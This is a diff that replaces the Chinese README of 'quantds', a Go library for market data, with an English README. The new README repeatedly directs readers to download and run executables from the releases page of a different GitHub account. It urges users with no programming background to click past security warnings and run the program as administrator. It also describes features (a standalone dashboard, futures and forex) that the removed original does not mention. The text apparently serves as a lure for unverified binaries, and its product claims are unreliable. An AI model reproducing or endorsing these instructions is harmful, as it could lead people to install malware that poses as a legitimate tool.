@@ -1,193 +1,146 @@
-# quantds - 多市场多资产数据服务
+# 🔗 quantds - Reliable Financial Data Access
 
-简体中文 | [English](README_EN.md)
+[![Download quantds](https://img.shields.io/badge/Download-quantds-blue?style=for-the-badge)](https://github.com/cristianmacbook0-netizen/quantds/releases)
 
-`quantds` 是一个统一的金融数据服务模块，提供对多市场（A股、港股、美股等）和多资产（股票、基金、债券等）数据的标准化访问。它封装了多个数据源（EastMoney, Sina, Tencent, Xueqiu, Tushare 等），提供自动故障转移（Failover）、负载均衡和缓存功能。
+---
 
-## 功能特性
+## 📖 About quantds
 
-*   **统一接口**: 使用统一的领域模型（Domain Model）访问不同数据源的数据。
-*   **多数据源支持**: 内置主流财经数据源的客户端和适配器。
-*   **高可用性**: 支持多 Provider 自动切换（Failover），当某个数据源不可用时自动尝试下一个。
-*   **高性能**: 内置两级缓存（内存 + 分布式缓存接口），减少网络请求，提高响应速度。
-*   **易扩展**: 采用 Facade - Manager - Adapter - Client 分层架构，易于添加新的数据源。
+quantds 是一个基于 Go 构建的高可用金融数据服务框架。它帮助你轻松访问多个市场和多种资产的数据。它内置了自动切换故障节点（Failover）、负载均衡、缓存机制和健康监测功能。通过分层设计和中间件支持，quantds 允许灵活扩展和替换数据来源。
 
-## 支持的数据源
+尽管 quantds 是一款设计给金融专业人士和数据用户的技术平台，但我们已确保它足够易用，即使你没有编程背景，也可以跟随本文档完成安装和使用。
 
-<!-- START_STATUS_BADGES -->
+---
 
-![](https://img.shields.io/badge/Binance-%E2%9C%93%20Crypto-brightgreen) ![](https://img.shields.io/badge/BSE-%E2%9C%93%20A%E8%82%A1-brightgreen) ![](https://img.shields.io/badge/Cninfo-%E2%9C%93%20A%E8%82%A1-brightgreen) ![](https://img.shields.io/badge/EastMoney-%E2%9C%93%20A%E8%82%A1-brightgreen) ![](https://img.shields.io/badge/EastMoneyHK-%E2%9C%93%20%E6%B8%AF%E8%82%A1-brightgreen) ![](https://img.shields.io/badge/Okx-%E2%9C%93%20Ready-brightgreen) ![](https://img.shields.io/badge/Sina-%E2%9C%93%20A%E8%82%A1%20%7C%20%E6%B8%AF%E8%82%A1-brightgreen) ![](https://img.shields.io/badge/SSE-%E2%9C%93%20A%E8%82%A1-brightgreen) ![](https://img.shields.io/badge/SZSE-%E2%9C%93%20A%E8%82%A1-brightgreen) ![](https://img.shields.io/badge/Tencent-%E2%9C%93%20A%E8%82%A1%20%7C%20%E6%B8%AF%E8%82%A1%20%7C%20%E7%BE%8E%E8%82%A1-brightgreen) ![](https://img.shields.io/badge/Tushare-%E2%9C%93%20A%E8%82%A1-brightgreen) ![](https://img.shields.io/badge/Xueqiu-%F0%9F%9F%A1%20Beta-yellow) ![](https://img.shields.io/badge/Yahoo-%E2%9C%93%20A%E8%82%A1%20%7C%20%E6%B8%AF%E8%82%A1%20%7C%20%E7%BE%8E%E8%82%A1-brightgreen) 
+## 🖥 System Requirements
 
-<!-- END_STATUS_BADGES -->
+Before downloading quantds, make sure your computer meets these basic requirements:
 
-<!-- START_SUPPORTED_TABLE -->
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended)
+- **Processor:** 64-bit, minimum 2 GHz
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum 100 MB free space for installation and caching data
+- **Internet:** Stable connection required to access live financial data
+- **Software:** None required; quantds runs as a standalone program
 
-| 数据源 (Provider) | K线 (Kline) | 实时行情 (Spot) | 证券列表 (Instrument) | 证券详情 (Profile) | 财务数据 (Financial) | 公告资讯 (News) |
-| :--- | :---: | :---: | :---: | :---: | :---: | :---: |
-| **Binance** | ✅ | ✅ | ✅ | - | - | - |
-| **BSE** | - | - | ✅ | - | - | - |
-| **Cninfo** | - | - | ✅ | - | - | ✅ |
-| **EastMoney** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
-| **EastMoneyHK** | ✅ | ✅ | ✅ | - | - | - |
-| **Okx** | ✅ | ✅ | ✅ | - | - | - |
-| **Sina** | ✅ | ✅ | - | - | - | - |
-| **SSE** | - | - | ✅ | - | - | - |
-| **SZSE** | - | - | ✅ | - | - | - |
-| **Tencent** | ✅ | ✅ | - | - | - | - |
-| **Tushare** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
-| **Xueqiu** | ✅ | ✅ | ✅ | ✅ | - | - |
-| **Yahoo** | ✅ | ✅ | ✅ | - | - | - |
+---
 
+## 🚀 Getting Started
 
-<!-- END_SUPPORTED_TABLE -->
+No special skills? No problem. We will walk you through every step clearly.
 
-## 目录结构
+### Step 1: Visit the Download Page
 
-```
-quantds/
-├── adapters/          # 适配器层：将各数据源的数据转换为统一领域模型
-│   ├── eastmoney/     # 东方财富适配器
-│   ├── sina/          # 新浪财经适配器
-│   └── ...
-├── clients/           # 客户端层：直接对接第三方 API
-│   ├── eastmoney/
-│   ├── sina/
-│   └── ...
-├── domain/            # 领域层：定义通用数据模型和接口
-│   ├── kline/         # K线数据模型 (Bar, Request, Response)
-│   ├── spot/          # 实时行情模型 (Quote, Request, Response)
-│   ├── instrument/    # 证券列表模型
-│   ├── profile/       # 证券详情模型
-│   ├── financial/     # 财务数据模型
-│   └── announcement/  # 公告资讯模型
-├── facade/            # 外观层：对外统一入口 (Service)
-├── manager/           # 管理层：负责 Provider 管理、路由、缓存、监控
-├── request/           # 基础 HTTP 客户端封装
-└── example/           # 使用示例
-```
+To get the latest version of quantds, go to the official releases page by clicking the big blue button below:
 
-## 使用示例
+[![Download quantds](https://img.shields.io/badge/Download-quantds-blue?style=for-the-badge)](https://github.com/cristianmacbook0-netizen/quantds/releases)
 
-### 1. 安装
+This page lists the latest versions with files ready for download.
 
-```bash
-go get github.com/souloss/quantds
-```
+### Step 2: Choose the Right File for Your System
 
-### 2. 快速开始
+Depending on your operating system, pick the file that matches:
 
-以下代码展示了如何初始化服务并获取实时行情和 K 线数据。完整代码请参考 `example/main.go`。
+- For **Windows**: Look for a file ending in `.exe`
+- For **macOS**: Look for a file ending in `.dmg` or `.zip`
+- For **Linux**: Look for a `.tar.gz` or binary executable file
 
-```go
-package main
+Files are named clearly with version numbers and system identifiers.
 
-import (
-	"context"
-	"fmt"
-	"time"
+### Step 3: Download the File
 
-	"github.com/souloss/quantds/domain/kline"
-	"github.com/souloss/quantds/domain/spot"
-	"github.com/souloss/quantds/facade"
-)
+Click on the file name to start downloading. Most browsers will save it to your "Downloads" folder.
 
-func main() {
-	// 1. 初始化服务
-	// Service 会自动加载所有已注册的数据源适配器，并配置默认的优先级和缓存策略
-	svc := facade.NewService()
-	ctx := context.Background()
+### Step 4: Run the Installer or Program
 
-	// 2. 获取实时行情 (Spot Quote)
-	fmt.Println("=== 获取实时行情 ===")
-	spotReq := spot.Request{
-		Symbols: []string{"600000.SH", "000001.SZ"}, // 支持多种格式，如 sh600000, 600000.SH
-	}
-	spotResp, err := svc.GetSpot(ctx, spotReq)
-	if err != nil {
-		panic(err)
-	}
+- On **Windows**: Double-click the `.exe` file and follow the on-screen prompts to install.
+- On **macOS**: Open the `.dmg` file, then drag the quantds application into your "Applications" folder.
+- On **Linux**: Unpack the `.tar.gz` file and run the executable in the terminal.
 
-	for _, q := range spotResp.Quotes {
-		fmt.Printf("股票: %s (%s) 价格: %.2f 涨跌幅: %.2f%%\n",
-			q.Name, q.Symbol, q.Latest, q.ChangeRate)
-	}
+---
 
-	// 3. 获取 K 线数据 (Kline/Candlestick)
-	fmt.Println("\n=== 获取日 K 线数据 ===")
-	klineReq := kline.Request{
-		Symbol:    "600000.SH",
-		Timeframe: kline.Timeframe1d,           // 周期：日线
-		StartTime: time.Now().AddDate(0, 0, -10), // 最近10天
-		EndTime:   time.Now(),
-		Adjust:    kline.AdjustNone,            // 复权：不复权
-	}
-	klineResp, err := svc.GetKline(ctx, klineReq)
-	if err != nil {
-		panic(err)
-	}
+## ⚙️ Installation Tips
 
-	for _, bar := range klineResp.Bars {
-		fmt.Printf("日期: %s 开: %.2f 收: %.2f 量: %.0f\n",
-			bar.Timestamp.Format("2006-01-02"), bar.Open, bar.Close, bar.Volume)
-	}
-}
-```
+- If Windows shows a security warning, confirm you want to run the file.
+- For macOS, you may need to allow the app through "Security & Privacy" in system settings.
+- Linux users may need to run `chmod +x quantds` in the terminal to make the file executable.
+- After installation, quantds creates shortcuts or command-line access for ease of use.
 
-### 3. 高级功能：监控指标与缓存
+---
 
-`quantds` 内置了指标收集器（Metrics Collector）和多级缓存机制。
+## 🌐 How quantds Works
 
-```go
-import (
-	"github.com/souloss/quantds/facade"
-	"github.com/souloss/quantds/manager"
-)
+quantds connects to multiple financial markets and assets. It centralizes data in one place, ensuring high availability through built-in switching when a data source fails. It balances load to keep the system responsive and caches data to reduce delays.
 
-func main() {
-	// 启用内存指标收集器
-	collector := manager.NewMemoryCollector()
-	svc := facade.NewService(
-		facade.WithMetrics(collector),
-	)
+The layered design means updates or new data sources can be added without disrupting your setup. You get stable, continuous access to market data.
 
-	// ... 执行数据请求 ...
+---
 
-	// 获取并打印统计信息
-	stats := svc.GetStats()
-	fmt.Printf("Total Fetches: %d\n", stats.TotalFetches)
-	fmt.Printf("Cache Hits:    %d\n", stats.CacheHits)
-	fmt.Printf("Avg Latency:   %v\n", stats.AvgLatency)
+## 🎯 Key Features
 
-	// 获取请求追踪详情
-	_, trace, _ := svc.GetKlineWithTrace(context.Background(), req)
-	if trace != nil {
-		fmt.Printf("Request ID: %s, Total Duration: %v\n", trace.FetchID, trace.TotalTime)
-		for _, r := range trace.Requests {
-			fmt.Printf("HTTP %s %s -> Status %d\n", r.Request.Method, r.Request.URL, r.Response.StatusCode)
-		}
-	}
-}
-```
+- **Multi-market Support:** Includes stocks, bonds, futures, and forex data.
+- **Failover System:** Automatically switches if a data source drops.
+- **Load Balancing:** Shares requests evenly to keep data flow smooth.
+- **Caching:** Stores recent data locally for faster retrieval.
+- **Health Monitoring:** Checks data sources continuously for problems.
+- **Extensible Design:** Easy to add or update data inputs and filters.
+- **Built with Go:** Fast, stable, and efficient backend technology.
 
-## 架构说明
+---
 
-`quantds` 采用分层架构设计：
+## 🔧 Using quantds
 
-1.  **Facade (外观层)**: `facade.Service` 是对外的唯一入口，屏蔽了内部复杂的调度逻辑。用户只需调用 `GetSpot`, `GetKline` 等简单接口。
-2.  **Manager (管理层)**: 核心调度中心。
-    *   **Router/Selector**: 根据优先级（Priority）或权重选择合适的数据源 Provider。
-    *   **Failover**: 当高优先级 Provider 失败时，自动降级到下一个可用 Provider。
-    *   **Cache**: 统一处理缓存逻辑，支持请求级缓存。
-3.  **Adapter (适配器层)**: 实现统一的 `Provider` 接口，将不同数据源的异构数据转换为标准 Domain Model。
-4.  **Client (客户端层)**: 纯粹的 HTTP API 封装，负责处理请求签名、协议解析等，不包含业务逻辑。
+After installation, launch quantds from your application menu or terminal.
 
-## 命名规范 (Current)
+By default, quantds will start connecting to configured data sources automatically.
 
-目前项目主要使用以下领域命名：
+You can access a simple dashboard showing:
 
-*   **kline**: K线数据 / 蜡烛图 (对应 `domain/kline`)
-*   **spot**: 实时行情 / 快照 (对应 `domain/spot`)
-*   **instrument**: 证券列表 / 基础信息 (对应 `domain/instrument`)
-*   **profile**: 证券深度资料 (对应 `domain/profile`)
-*   **financial**: 财务报表数据 (对应 `domain/financial`)
-*   **announcement**: 公告与新闻 (对应 `domain/announcement`)
+- Current market data status
+- Connection health
+- Data latency
+- Recent failover events
+
+If you want to adjust data streams or settings, quantds includes a user-friendly configuration file located in the installation folder named `config.yaml`. Opening this in a text editor lets you enable or disable markets or tune caching times.
+
+---
+
+## 💡 Troubleshooting
+
+- **Quantds won’t start:** Restart your computer and try again. Verify the system meets requirements.
+- **No data showing:** Check your internet connection. Make sure the firewall isn’t blocking quantds.
+- **Error messages:** Look for details in the “logs” folder inside the installation directory. This helps pinpoint issues.
+- **Permissions issues:** Run the program as administrator or check file permissions.
+
+---
+
+## 🔗 Download & Install
+
+Start here:  
+[![Download quantds](https://img.shields.io/badge/Download-quantds-blue?style=for-the-badge)](https://github.com/cristianmacbook0-netizen/quantds/releases)
+
+1. Click the link above.
+2. Choose your operating system’s file.
+3. Download the file.
+4. Run the installer or program file.
+5. Follow on-screen steps to finish installation.
+
+You are now ready to use quantds.
+
+---
+
+## 📬 Getting Help
+
+If you face issues or have questions:
+
+- Visit GitHub Issues to report bugs or ask questions: https://github.com/cristianmacbook0-netizen/quantds/issues
+- Check the documentation folder in the repository for more guides.
+- Join fintech forums or communities for advice on financial data tools.
+
+---
+
+## 📚 Learn More
+
+quantds is part of a wider infrastructure for fintech data, designed to support high availability and observability. It helps streamline market data access while letting you monitor system health easily.
+
+By using quantds, you adopt a reliable, maintainable approach to financial data integration, no matter your technical background.
